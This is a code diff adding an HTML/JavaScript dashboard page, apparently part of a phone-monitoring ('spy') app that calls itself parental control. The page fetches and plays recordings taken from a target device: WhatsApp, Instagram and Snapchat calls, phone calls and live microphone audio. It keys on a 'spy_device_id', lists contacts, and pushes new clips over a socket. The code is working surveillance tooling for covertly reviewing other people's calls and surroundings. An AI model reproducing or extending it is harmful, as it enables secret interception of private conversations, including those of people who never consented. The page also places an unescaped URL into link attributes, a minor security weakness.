@@ -1,0 +1,410 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Audio Recordings</title>
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
+    
+    <script src="/socket.io/socket.io.js"></script>
+
+    <style>
+        :root {
+            --bg-dark: #050509;
+            --card-bg: rgba(22, 27, 34, 0.8);
+            --border: rgba(255, 255, 255, 0.1);
+            --accent-red: #ff3b30;
+            --accent-blue: #0a84ff;
+            --accent-green: #30d158;
+            --accent-orange: #ff9f0a;
+            --text-main: #ffffff;
+            --text-muted: #8b949e;
+            --glass: blur(12px);
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: var(--bg-dark);
+            background-image: radial-gradient(circle at top, #161b22 0%, #000 100%);
+            color: var(--text-main);
+            margin: 0; padding: 0; min-height: 100vh;
+        }
+
+        .header {
+            position: sticky; top: 0; z-index: 100;
+            background: rgba(5, 5, 9, 0.9); backdrop-filter: var(--glass);
+            border-bottom: 1px solid var(--border);
+            padding: 15px 20px; display: flex; flex-direction: column; gap: 15px;
+        }
+
+        .top-bar { display: flex; justify-content: space-between; align-items: center; }
+        .back-btn { color: var(--text-main); font-size: 1.2rem; text-decoration: none; margin-right: 15px; }
+        .title { font-size: 1.2rem; font-weight: 600; letter-spacing: 0.5px; display: flex; align-items: center; }
+
+        .live-badge {
+            font-size: 0.7rem; background: rgba(48, 209, 88, 0.15); color: var(--accent-green); 
+            padding: 4px 10px; border-radius: 20px; border: 1px solid rgba(48, 209, 88, 0.3);
+            display: flex; align-items: center; gap: 6px;
+        }
+
+        .dot { width: 6px; height: 6px; background: var(--accent-green); border-radius: 50%; animation: pulse 1.5s infinite; }
+
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 0 rgba(48, 209, 88, 0.7); }
+            70% { box-shadow: 0 0 0 6px rgba(48, 209, 88, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(48, 209, 88, 0); }
+        }
+
+        .filters { display: flex; gap: 10px; overflow-x: auto; padding-bottom: 5px; scrollbar-width: none; }
+        .filter-pill {
+            background: rgba(255,255,255,0.05); border: 1px solid var(--border);
+            padding: 8px 16px; border-radius: 20px; font-size: 0.85rem; color: var(--text-muted);
+            cursor: pointer; white-space: nowrap; transition: 0.3s;
+        }
+        .filter-pill.active { background: var(--text-main); color: #000; font-weight: 600; border-color: var(--text-main); }
+
+        .container { max-width: 800px; margin: 12px auto 20px; padding: 0 15px; padding-bottom: 80px; }
+
+        .section-head {
+            max-width: 800px; margin: 18px auto 8px; padding: 0 15px;
+            display: flex; align-items: center; justify-content: space-between; gap: 12px;
+        }
+        .section-head h3 {
+            color: #fff; font-size: 1rem; margin: 0;
+            display: flex; align-items: center; gap: 10px; font-weight: 600;
+        }
+        .go-live {
+            font-size: 0.8rem; color: var(--accent-green); text-decoration: none;
+            padding: 6px 12px; border-radius: 16px; border: 1px solid rgba(48, 209, 88, 0.3);
+            background: rgba(48, 209, 88, 0.1); white-space: nowrap;
+        }
+        .go-live:hover { background: rgba(48, 209, 88, 0.2); }
+
+        .card {
+            background: var(--card-bg); border: 1px solid var(--border); border-radius: 12px;
+            padding: 15px; margin-bottom: 14px; display: flex; flex-direction: column; gap: 12px;
+            animation: slideUp 0.4s ease;
+        }
+
+        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+
+        .card-top { display: flex; justify-content: space-between; align-items: center; }
+        .file-info { display: flex; align-items: center; gap: 12px; }
+
+        .icon-box {
+            width: 40px; height: 40px; border-radius: 10px; display: flex; align-items: center; justify-content: center;
+            font-size: 1.2rem; background: rgba(255,255,255,0.05);
+        }
+
+        .whatsapp { color: #25D366; background: rgba(37, 211, 102, 0.1); }
+        .instagram { color: #E1306C; background: rgba(225, 48, 108, 0.1); }
+        .call { color: #0a84ff; background: rgba(10, 132, 255, 0.1); }
+        .mic { color: #ff3b30; background: rgba(255, 59, 48, 0.1); }
+
+        .details h4 { margin: 0; font-size: 0.95rem; font-weight: 500; color: #fff; }
+        .details span { font-size: 0.75rem; color: var(--text-muted); }
+
+        .action-btns { display: flex; gap: 8px; }
+
+        .boost-btn {
+            background: rgba(255, 159, 10, 0.15); color: var(--accent-orange); width: 35px; height: 35px;
+            border-radius: 50%; display: flex; align-items: center; justify-content: center;
+            border: 1px solid rgba(255, 159, 10, 0.3); cursor: pointer; transition: 0.3s;
+        }
+        .boost-btn.active { background: var(--accent-orange); color: #000; box-shadow: 0 0 15px var(--accent-orange); }
+
+        .download-btn {
+            background: rgba(255,255,255,0.1); color: #fff; width: 35px; height: 35px;
+            border-radius: 50%; display: flex; align-items: center; justify-content: center;
+            text-decoration: none; transition: 0.3s;
+        }
+        .download-btn:hover { background: var(--accent-blue); }
+
+        audio {
+            width: 100%; height: 36px; border-radius: 20px; filter: invert(1) hue-rotate(180deg); opacity: 0.8;
+        }
+
+        .status-msg { text-align: center; color: var(--text-muted); margin-top: 50px; font-size: 0.9rem; }
+        
+        #accessDenied {
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: #000; z-index: 999; align-items: center; justify-content: center; flex-direction: column;
+        }
+    </style>
+</head>
+<body>
+
+    <div id="accessDenied">
+        <h2 style="color: var(--accent-red);">ACCESS DENIED</h2>
+        <p style="color: var(--text-muted);">No Target ID Found.</p>
+        <button onclick="window.history.back()" style="padding: 10px 20px; background: var(--text-main); border: none; border-radius: 5px; cursor: pointer;">Go Back</button>
+    </div>
+
+    <div class="header">
+        <div class="top-bar">
+            <div class="title">
+                <a href="index.html" class="back-btn" id="backLink"><i class="fa-solid fa-arrow-left"></i></a>
+                <span><i class="fa-solid fa-microphone-lines"></i> Audio Recordings</span>
+            </div>
+            <div class="live-badge">
+                <div class="dot"></div> ONLINE
+            </div>
+        </div>
+
+        <div class="filters">
+            <div class="filter-pill active" onclick="filterBy('All', this)">All</div>
+            <div class="filter-pill" onclick="filterBy('WhatsApp', this)">WhatsApp</div>
+            <div class="filter-pill" onclick="filterBy('Instagram', this)">Instagram</div>
+            <div class="filter-pill" onclick="filterBy('Snapchat', this)">Snapchat</div>
+            <div class="filter-pill" onclick="filterBy('Call', this)">Calls</div>
+        </div>
+    </div>
+
+    <div class="section-head">
+        <h3>
+            <i class="fa-solid fa-clock-rotate-left" style="color: var(--accent-blue);"></i> Recording History
+        </h3>
+        <a class="go-live" id="goLiveLink" href="view_audio.html">
+            <i class="fa-solid fa-headphones"></i> Live / Record
+        </a>
+    </div>
+
+    <div class="container" id="recordingsList">
+        <div class="status-msg">Fetching Audio Logs...</div>
+    </div>
+
+    <script>
+        const SERVER_URL = (window.location.origin.includes('localhost') || window.location.protocol === 'file:')
+            ? 'https://parents-control-website1.onrender.com'
+            : window.location.origin;
+        const socket = io(SERVER_URL, { transports: ['websocket', 'polling'] });
+        let allRecordings = [];
+        let currentFilter = 'All';
+        let currentDeviceId = '';
+
+        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+        const nodes = new Map();
+
+        window.onload = () => {
+            const urlParams = new URLSearchParams(window.location.search);
+            const urlID = urlParams.get('id');
+            currentDeviceId = urlID || localStorage.getItem('spy_device_id');
+
+            if (!currentDeviceId) {
+                document.getElementById('accessDenied').style.display = 'flex';
+                return;
+            }
+            localStorage.setItem('spy_device_id', currentDeviceId);
+            document.getElementById('backLink').href = 'index.html?id=' + encodeURIComponent(currentDeviceId);
+            document.getElementById('goLiveLink').href = 'view_audio.html?id=' + encodeURIComponent(currentDeviceId);
+            fetchHistory();
+            socket.emit('join', currentDeviceId);
+        };
+
+        function cleanSourceText(value) {
+            return String(value || '').replace(/\.[^/.]+$/, '').replace(/\s+/g, ' ').trim();
+        }
+
+        function titleCase(value) {
+            return cleanSourceText(value).split(/[ _-]+/).filter(Boolean)
+                .map(part => part.charAt(0).toUpperCase() + part.slice(1).toLowerCase()).join(' ');
+        }
+
+        function getDisplayName(filename, app, recordingType) {
+            const raw = cleanSourceText(filename);
+            const lower = raw.toLowerCase();
+            if (!raw) return app ? `${app} Recording` : 'Audio Recording';
+            if (/live[_ -]?audio/i.test(raw)) return 'Live Audio Recording';
+
+            // New Android builds use rec_<source>_<timestamp>.m4a. Older builds
+            // used <source>_<person>_<timestamp>.m4a. Preserve the person when it exists.
+            // Cloudinary public_id may include device/folder prefixes; display only the filename part.
+            let base = raw.replace(/^.*[\\/]/, '').replace(/^rec[_ -]?/i, '');
+            base = base.replace(/[_ -]?\d{10,}$/i, '').replace(/^recording[_ -]?/i, '');
+            // The app prefixes cellular recordings with Normal_Call and fallback calls with Call_Receiver.
+            base = base.replace(/^(normal[_ -]?call|call[_ -]?receiver|social[_ -]?call[_ -]?detected)[_ -]*/i, '');
+            const known = ['whatsapp', 'instagram', 'snapchat', 'telegram', 'messenger',
+                'call', 'phone', 'dialer'];
+            const parts = base.split(/[_ -]+/).filter(Boolean);
+            while (parts.length && known.includes(parts[0].toLowerCase())) parts.shift();
+            const person = titleCase(parts.join(' '));
+
+            if (app === 'WhatsApp' || app === 'Instagram' || app === 'Snapchat') {
+                return person && !/^call$/i.test(person) ? `${app} - ${person}` : `${app} Call`;
+            }
+            if (app === 'Call') {
+                return person && !/^(receiver|internal|social call detected|call)$/i.test(person)
+                    ? `Call - ${person}` : 'Call Recording';
+            }
+            if (recordingType === 'live_audio' || app === 'Mic') return 'Live Audio Recording';
+            return person || `${app || 'Audio'} Recording`;
+        }
+
+        function toggleBoost(btn, audioId) {
+            if (audioCtx.state === 'suspended') audioCtx.resume();
+            const audio = document.getElementById(audioId);
+            if (!nodes.has(audioId)) {
+                const source = audioCtx.createMediaElementSource(audio);
+                const gainNode = audioCtx.createGain();
+                source.connect(gainNode);
+                gainNode.connect(audioCtx.destination);
+                nodes.set(audioId, gainNode);
+            }
+            const gainNode = nodes.get(audioId);
+            if (btn.classList.contains('active')) {
+                gainNode.gain.value = 1.0;
+                btn.classList.remove('active');
+            } else {
+                gainNode.gain.value = 5.0;
+                btn.classList.add('active');
+            }
+        }
+
+        function render() {
+            const container = document.getElementById('recordingsList');
+            container.innerHTML = '';
+            const filtered = allRecordings.filter(rec => currentFilter === 'All' ? true : rec.app === currentFilter);
+
+            if (filtered.length === 0) {
+                container.innerHTML = `<div class="status-msg">No audio clips found.</div>`;
+                return;
+            }
+
+            filtered.forEach((rec, index) => {
+                const iconInfo = getIconInfo(rec.app);
+                const audioId = `audio_${index}`;
+                container.innerHTML += `
+                    <div class="card">
+                        <div class="card-top">
+                            <div class="file-info">
+                                <div class="icon-box ${iconInfo.cls}"><i class="${iconInfo.icon}"></i></div>
+                                <div class="details">
+                                    <h4>${escapeHtml(rec.displayName)}</h4>
+                                    <span>${escapeHtml(rec.app)}${rec.contact ? ' - ' + escapeHtml(rec.contact) : ''} • ${escapeHtml(rec.date)} • ${escapeHtml(rec.time)}${rec.duration ? ' • ' + escapeHtml(formatDuration(rec.duration)) : ''}</span>
+                                </div>
+                            </div>
+                            <div class="action-btns">
+                                <button class="boost-btn" onclick="toggleBoost(this, '${audioId}')" title="Boost Volume">
+                                    <i class="fa-solid fa-volume-high"></i>
+                                </button>
+                                <a href="${rec.url}" download="${rec.displayName}.m4a" target="_blank" class="download-btn" title="Download">
+                                    <i class="fa-solid fa-download"></i>
+                                </a>
+                            </div>
+                        </div>
+                        <audio id="${audioId}" controls crossorigin="anonymous" preload="metadata">
+                            <source src="${escapeHtml(rec.url)}" type="audio/mp4">
+                        </audio>
+                    </div>
+                `;
+            });
+        }
+
+        async function fetchHistory() {
+            try {
+                const res = await fetch(`${SERVER_URL}/api/audio-history/${encodeURIComponent(currentDeviceId)}`);
+                const data = await res.json();
+                if (Array.isArray(data)) {
+                    allRecordings = data
+                        .map(file => processCloudinaryFile(file))
+                        .filter(Boolean)
+                        .sort((a, b) => (b.createdAt || 0) - (a.createdAt || 0));
+                    render();
+                }
+            } catch (e) {
+                document.getElementById('recordingsList').innerHTML =
+                    `<div class="status-msg" style="color:var(--accent-red)">Connection Error!</div>`;
+            }
+        }
+
+        function escapeHtml(value) {
+            return String(value == null ? '' : value)
+                .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
+                .replace(/"/g, '&quot;').replace(/'/g, '&#039;');
+        }
+
+        function formatDuration(seconds) {
+            const n = Number(seconds);
+            if (!Number.isFinite(n) || n <= 0) return '';
+            const total = Math.round(n);
+            return `${Math.floor(total / 60)}:${String(total % 60).padStart(2, '0')}`;
+        }
+
+        function processCloudinaryFile(file) {
+            if (!file) return null;
+            const d = new Date(file.created_at || file.uploaded_at || file.createdAt);
+            const fileName = file.filename || file.display_name || file.name || file.public_id || '';
+            const location = [file.recording_type, file.asset_folder, file.folder, file.public_id, fileName]
+                .filter(Boolean).join('/');
+            const app = detectApp(location);
+            const recordingType = String(file.recording_type || '').toLowerCase();
+            const url = file.secure_url || file.url || '';
+            if (!url) return null;
+            const displaySource = file.display_name || file.filename || file.public_id || fileName;
+            return {
+                app,
+                recordingType,
+                displayName: getDisplayName(displaySource, app, recordingType),
+                contact: extractContact(displaySource, app),
+                date: isNaN(d.getTime()) ? new Date().toLocaleDateString() : d.toLocaleDateString(),
+                time: isNaN(d.getTime())
+                    ? new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })
+                    : d.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }),
+                duration: file.duration || file.duration_seconds || 0,
+                createdAt: isNaN(d.getTime()) ? 0 : d.getTime(),
+                url,
+                id: currentDeviceId,
+                cloudinaryId: file.asset_id || file.public_id || file.secure_url || ''
+            };
+        }
+
+        function extractContact(value, app) {
+            if (!value || !app || app === 'Call' || app === 'Mic') return '';
+            let s = cleanSourceText(value).replace(/^.*[\\/]/, '').replace(/^rec[_ -]?/i, '').replace(/[_ -]?\d{10,}$/i, '');
+            const prefixes = { WhatsApp: 'whatsapp', Instagram: 'instagram', Snapchat: 'snapchat' };
+            const prefix = prefixes[app];
+            if (prefix) s = s.replace(new RegExp('^' + prefix + '[_ -]?', 'i'), '');
+            return titleCase(s);
+        }
+
+        function detectApp(value) {
+            const name = String(value || '').toLowerCase();
+            if (name.includes('whatsapp')) return 'WhatsApp';
+            if (name.includes('instagram')) return 'Instagram';
+            if (name.includes('snapchat')) return 'Snapchat';
+            if (name.includes('live_audio') || name.includes('live audio') || name.includes('mic')) return 'Mic';
+            // The API returns call recordings in <deviceId>/calls even when
+            // the filename is only rec_<timestamp>.m4a.
+            if (name.includes('/calls') || name.includes('\\\\calls') || name.includes('/call')
+                || name.includes('dialer') || name.includes('phone') || name.includes('normal_call')) return 'Call';
+            return 'Mic';
+        }
+
+        function getIconInfo(app) {
+            if (app === 'WhatsApp') return { cls: 'whatsapp', icon: 'fab fa-whatsapp' };
+            if (app === 'Instagram') return { cls: 'instagram', icon: 'fab fa-instagram' };
+            if (app === 'Snapchat') return { cls: 'snapchat', icon: 'fab fa-snapchat-ghost' };
+            if (app === 'Mic') return { cls: 'mic', icon: 'fas fa-microphone-lines' };
+            return { cls: 'call', icon: 'fas fa-phone-volume' };
+        }
+
+        function filterBy(filter, btnElement) {
+            currentFilter = filter;
+            document.querySelectorAll('.filter-pill').forEach(btn => btn.classList.remove('active'));
+            btnElement.classList.add('active');
+            render();
+        }
+
+        socket.on('new-audio', (data) => {
+            if (data.device_id !== currentDeviceId) return;
+            const rec = processCloudinaryFile(data);
+            if (!rec) return;
+            allRecordings = allRecordings.filter(existing => existing.cloudinaryId !== rec.cloudinaryId);
+            allRecordings.unshift(rec);
+            render();
+        });
+    </script>
+</body>
+</html>
